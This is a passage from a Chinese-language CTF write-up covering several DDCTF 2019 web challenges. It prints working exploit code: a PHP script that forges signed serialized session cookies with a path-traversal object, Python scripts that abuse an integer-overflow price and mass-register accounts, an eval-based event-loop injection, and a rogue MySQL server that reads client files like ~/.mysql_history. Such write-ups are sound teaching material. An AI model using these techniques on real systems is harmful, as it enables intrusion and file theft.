class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到<code>key</code>之后构造ddctfid:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//nickname = %s</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'a:4:&#123;s:10:"session_id";s:32:"3f65fc339c032f85048e42f21fab4ef0";s:10:"ip_address";s:14:"211.137.22.191";s:10:"user_agent";s:78:"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";s:9:"user_data";s:0:"";&#125;'</span>;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path = <span class="string">'....//config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$b[<span class="string">'user_data'</span>] = <span class="keyword">new</span> Application;</span><br><span class="line"></span><br><span class="line">$d = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($d.md5($key.$d));</span><br></pre></td></tr></table></figure>

<p>传参即可。</p>
<h2 id="大吉大利今晚吃鸡"><a href="#大吉大利今晚吃鸡" class="headerlink" title="大吉大利今晚吃鸡"></a>大吉大利今晚吃鸡</h2><p>遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出<code>0xffffffff+1</code>，传参进去就买到了。<br>然后要淘汰100个人，实际上要淘汰149个人。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://117.51.147.155:5050'</span></span><br><span class="line">seq = [</span><br><span class="line">    <span class="string">'register'</span>,</span><br><span class="line">    <span class="string">'login'</span>,</span><br><span class="line">    <span class="string">'balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">    <span class="string">'buy'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">     <span class="string">'pay'</span>]</span><br><span class="line"></span><br><span class="line">url_seg = &#123;</span><br><span class="line">    <span class="string">'register'</span>:<span class="string">'/ctf/api/register?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'login'</span>:<span class="string">'/ctf/api/login?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'balance'</span>:<span class="string">'/ctf/api/get_user_balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>:<span class="string">'/ctf/api/search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>:<span class="string">'/ctf/api/search_bill_info'</span>,</span><br><span class="line">    <span class="string">'buy'</span>:<span class="string">'/ctf/api/buy_ticket?ticket_price=4294967296'</span>,</span><br><span class="line">    <span class="string">'remove'</span>:<span class="string">'/ctf/api/remove_robot?id=&#123;0&#125;&amp;ticket=&#123;1&#125;'</span>,</span><br><span class="line">    <span class="string">'pay'</span>:<span class="string">'/ctf/api/pay_ticket?bill_id=&#123;0&#125;'</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">victiom =&#123;</span><br><span class="line"> <span class="number">1</span>: <span class="string">'21cb23b38e33426812d68991dbb6ba68'</span>,</span><br><span class="line"> <span class="number">2</span>: <span class="string">'6f89be1e66c9bd69bce99952aa009a96'</span>,</span><br><span class="line"> <span class="number">3</span>: <span class="string">'70e1b0196609646efd0aacea613943d6'</span>,</span><br><span class="line"> <span class="number">4</span>: <span class="string">'46f7f7e50b54a636f3aae60dd839590b'</span>,</span><br><span class="line"> <span class="number">5</span>: <span class="string">'395b9fb4fb0f3cf42a727d43536be457'</span>,</span><br><span class="line"> ···</span><br><span class="line"> ···</span><br><span class="line"> <span class="number">147</span>: <span class="string">'4cc522f84f11189d9737ab18fc22fcd0'</span>,</span><br><span class="line"> <span class="number">148</span>: <span class="string">'8f2675372aa0f2ecfee1aeeee3d814cd'</span>,</span><br><span class="line"> <span class="number">149</span>: <span class="string">'7544b9ee45ae6ae7066305d472077638'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_login_get_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> victiom </span><br><span class="line">    <span class="keyword">global</span> session</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        username = random.sample(string.letters, <span class="number">19</span>)    </span><br><span class="line">        username1 = <span class="string">''</span>.join(username)</span><br><span class="line">        register1 = url_seg[<span class="string">'register'</span>].format(str(username1))</span><br><span class="line">        reg_url = url + register1</span><br><span class="line">        <span class="keyword">print</span> reg_url</span><br><span class="line">        res = session.get(reg_url).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(username1)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            res = html.content</span><br><span class="line">            josnn = json.loads(html.text)</span><br><span class="line">            id = josnn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'id'</span>]</span><br><span class="line">            <span class="comment"># 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式</span></span><br><span class="line">            ticket = re.search(<span class="string">"ticket\":\"(.*?)\""</span>, res).group(<span class="number">1</span>)</span><br><span class="line">            victiom[id] = ticket</span><br><span class="line">            <span class="keyword">print</span> victiom</span><br><span class="line">            <span class="keyword">if</span> len(victiom) == <span class="number">149</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_other</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    regiter1  = url_seg[<span class="string">'register'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">    reg_url = url + regiter1</span><br><span class="line">    res = session.get(reg_url).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> victiom.items():    </span><br><span class="line">                remove = url_seg[<span class="string">'remove'</span>].format(str(key), value)</span><br><span class="line">                rem_url = url + remove</span><br><span class="line">                <span class="keyword">print</span> session.get(rem_url).content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 注册过快可能会被封</span></span><br><span class="line">    register_login_get_ticket()</span><br><span class="line">    delete_other()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>学长的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span></span><br><span class="line">        html = requests.get(url)</span><br><span class="line">        print(html.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ticket</span><span class="params">(i)</span>:</span></span><br><span class="line"></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span>)</span><br><span class="line">        html = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span>)</span><br><span class="line">        json1 = json.loads(html.text)</span><br><span class="line">        ticketid = json1[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]</span><br><span class="line">        html1 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span>+ticketid)</span><br><span class="line">        html2 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span>)</span><br><span class="line">        json2 = json.loads(html2.text)</span><br><span class="line">        id = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"id"</span>]</span><br><span class="line">        ticket = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"ticket"</span>]</span><br><span class="line"></span><br><span class="line">        pack = &#123;<span class="string">"id"</span>:id , <span class="string">"ticket"</span>:ticket&#125;</span><br><span class="line">        <span class="keyword">return</span> pack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_people</span><span class="params">(id,ticket)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic&amp;password=12345678"</span>)</span><br><span class="line">    html = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id="</span>+str(id)+<span class="string">"&amp;ticket="</span>+ticket)</span><br><span class="line">    print(html.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    reg()</span><br><span class="line">    <span class="comment">#get_ticket()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        pack = get_ticket(i)</span><br><span class="line">        id = pack[<span class="string">"id"</span>]</span><br><span class="line">        ticket = pack[<span class="string">"ticket"</span>]</span><br><span class="line">        print(id)</span><br><span class="line">        print(ticket)</span><br><span class="line">        del_people(id, ticket)</span><br><span class="line">        <span class="comment">#del_people(id,ticket)</span></span><br></pre></td></tr></table></figure>

<h2 id="滴"><a href="#滴" class="headerlink" title="滴"></a>滴</h2><p>沙雕题目，要读取的文件<code>.practice.txt.swp</code>在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了</p>
<h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>上传一张图片，提示缺少字段<code>phpinfo()</code>,并显示出了上传后的图片，下载后放入<code>010editor</code>中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加<code>phpinfo()</code>上传就有flag了。</p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>read the source code first</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66741e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put event in a queue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the string between prefix and postfix</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># handle a event everytime</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># trigger_event%23;get_flag</span></span><br><span class="line">                <span class="comment"># 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。</span></span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">    </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png" alt="Screenshot from 2019-04-29 17-29-27"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png" alt="Screenshot from 2019-04-29 17-28-05"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png" alt="Screenshot from 2019-04-29 17-28-36"></p>
<p>这里有个点有疑问：</p>
<ul>
<li>为什么<code>get_flag_handle</code>函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。</li>
</ul>
<p>值得注意的是，<code>get_flag_handle</code> 和 <code>buy</code>函数是在<code>consume_point_function</code>执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将<code>buy</code>和<code>get_flag</code>函数插入在<code>consume_point_function</code>前面的话，他们会先执行并获取到<code>flag</code>， 注意到<code>trigger_event</code>会将flag放进<code>log</code>之中去并放在<code>session</code>中显示回来。</p>
<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p><img src="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png" alt="QQ截图20190511214737"></p>
<p>客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。</p>
<p>题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 <code>result = [{&#39;local_address&#39;:&quot;0.0.0.0:3306&quot;,&#39;Process_name&#39;:&quot;1234/mysqld&quot;}]</code>，这样就可以绕过客户端的验证了。</p>
<p>然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">'0.0.0.0'</span></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename = '/etc/passwd'</span></span><br><span class="line">filename = <span class="string">'~/.mysql_history'</span></span><br><span class="line"></span><br><span class="line">greeting = <span class="string">"5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">login_conf = <span class="string">"0700000200000002000000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的chr值得注意</span></span><br><span class="line">evil_request = chr(len(filename) + <span class="number">1</span>)+<span class="string">"\x00\x00\x01\xfb"</span>+filename</span><br><span class="line"></span><br><span class="line">conn, addr = server.accept()</span><br><span class="line">conn.send(greeting)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(login_conf)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(evil_request)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>

